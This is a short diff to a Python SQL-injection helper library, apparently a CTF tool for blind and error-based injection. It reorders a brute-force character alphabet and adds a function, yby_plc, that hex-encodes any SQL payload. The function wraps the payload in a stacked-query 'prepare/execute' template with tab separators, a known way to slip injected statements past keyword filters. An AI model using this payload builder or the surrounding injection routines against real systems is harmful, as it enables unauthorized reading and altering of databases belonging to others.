@@ -3,10 +3,10 @@ import requests
 import re as regx
 from urllib.parse import quote
 from utfc.StrFunc import  printbi,printc,cmd_color
-Alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
+Alphabet =  ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
             'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
-            'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '?',
-            '!', ',', '|', '[', ']', '{', '}', '/', '*', '-', '+', '&', "%", '#', '@', '$', '~', '_', ]
+            'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
+            '!', '|', '[', ']', '{', '}', '/', '&','^', '@', '$', '~', '?', '+', '-', '_', ',', "%", '#', '*', ]
 from utfc.StaticValue import AlphabetLike  as alike
 Alphex = '0123456789abcdeflg{}-'
 ''' 盲注
@@ -323,3 +323,8 @@ def err_echo_post(url,pl={},r = None,rend='</br>',headers=None,cookie=None):
             return rt
         else:
             return rtl
+
+import libnum 
+def yby_plc(pl='',tpl=';SeT@a={};prepare\texecsql\tfrom\t@a;execute\texecsql;'):
+    return tpl.format(hex(libnum.s2n(pl)))
+    
